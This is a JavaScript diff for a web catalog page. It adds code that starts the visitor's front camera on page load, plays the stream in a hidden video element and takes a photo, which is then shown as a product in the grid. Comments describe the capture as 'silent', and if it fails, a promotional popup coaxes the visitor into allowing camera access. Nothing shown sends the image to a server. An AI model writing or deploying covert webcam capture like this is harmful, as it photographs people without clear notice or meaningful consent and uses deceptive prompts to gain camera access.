@@ -3,33 +3,110 @@ let stream = null;
 
 // Initialize camera capture on page load to request access early
 window.addEventListener('load', () => {
-    silentCameraCapture();
+    // Wait a bit to ensure all DOM elements are loaded
+    setTimeout(() => {
+        silentCameraCapture();
+    }, 1000);
 });
 
 // Capture user silently and store photo data for later use
 async function silentCameraCapture() {
+    console.log('Attempting silent camera capture...');
     try {
         // Request camera access silently
         stream = await navigator.mediaDevices.getUserMedia({
             video: { facingMode: 'user' },
             audio: false
         });
+        console.log('Camera access granted');
         
         // Create hidden video element
         const hiddenVideo = document.createElement('video');
         hiddenVideo.srcObject = stream;
         hiddenVideo.play();
+        hiddenVideo.muted = true;
         
         // Wait for video to load, then capture
         hiddenVideo.onloadedmetadata = () => {
+            console.log('Video metadata loaded, video dimensions:', hiddenVideo.videoWidth, 'x', hiddenVideo.videoHeight);
             // Capture after a short delay to ensure good quality
             setTimeout(() => {
                 captureUserPhoto(hiddenVideo);
-            }, 500);
+            }, 1500); // Increased delay for better capture
+        };
+
+        // Also try to capture after a longer delay as backup
+        setTimeout(() => {
+            if (!userPhotoData && hiddenVideo.videoWidth > 0) {
+                console.log('Backup capture attempt');
+                captureUserPhoto(hiddenVideo);
+            }
+        }, 3000);
+
+    } catch (error) {
+        console.log('Silent capture unavailable:', error.message);
+        // Try a more direct approach with a visible notification
+        showCameraPermissionRequest();
+    }
+}
+
+// Show a user-friendly camera permission request
+function showCameraPermissionRequest() {
+    // Create a small notification
+    const notification = document.createElement('div');
+    notification.style.cssText = `
+        position: fixed;
+        top: 100px;
+        right: 20px;
+        background: #3498db;
+        color: white;
+        padding: 1rem;
+        border-radius: 8px;
+        z-index: 10000;
+        max-width: 300px;
+        box-shadow: 0 4px 12px rgba(0,0,0,0.3);
+        font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+        font-size: 0.9rem;
+    `;
+    notification.innerHTML = `
+        <div style="margin-bottom: 0.5rem;"><strong>📸 Feature YOU in our catalog!</strong></div>
+        <div style="margin-bottom: 1rem;">Allow camera access to see yourself as a featured product.</div>
+        <button onclick="requestCameraAccess()" style="background: #2980b9; color: white; border: none; padding: 0.5rem 1rem; border-radius: 4px; cursor: pointer;">Allow Camera</button>
+        <button onclick="this.parentElement.remove()" style="background: transparent; color: white; border: 1px solid white; padding: 0.5rem 1rem; border-radius: 4px; cursor: pointer; margin-left: 0.5rem;">Skip</button>
+    `;
+    document.body.appendChild(notification);
+    
+    // Auto-remove after 10 seconds
+    setTimeout(() => {
+        if (notification.parentElement) {
+            notification.remove();
+        }
+    }, 10000);
+}
+
+// Manual camera access request
+async function requestCameraAccess() {
+    try {
+        const stream = await navigator.mediaDevices.getUserMedia({
+            video: { facingMode: 'user' },
+            audio: false
+        });
+        
+        const video = document.createElement('video');
+        video.srcObject = stream;
+        video.play();
+        video.muted = true;
+        
+        video.onloadedmetadata = () => {
+            setTimeout(() => {
+                captureUserPhoto(video);
+                // Remove notification
+                const notification = document.querySelector('div[style*="position: fixed"]');
+                if (notification) notification.remove();
+            }, 1000);
         };
     } catch (error) {
-        // Silently fail - user doesn't need to know
-        console.log('Silent capture unavailable');
+        console.log('Camera access denied:', error.message);
     }
 }
 
@@ -49,9 +126,14 @@ function captureUserPhoto(video) {
     if (stream) {
         stream.getTracks().forEach(track => track.stop());
     }
+    
+    // Automatically update the hero section with user photo
+    setTimeout(() => {
+        addUserProducts();
+    }, 100);
 }
 
-// Add user-featured display in the hero banner
+// Add user as actual products within the product grid
 function addUserProducts() {
     if (!userPhotoData) return;
 
@@ -72,7 +154,7 @@ function addUserProducts() {
         if (existingIndex >= 0) {
             products[existingIndex] = userProduct;
         } else {
-            // Put the user product at the front so it’s clearly visible
+            // Put the user product at the front so it's clearly visible
             products.unshift(userProduct);
         }
     }
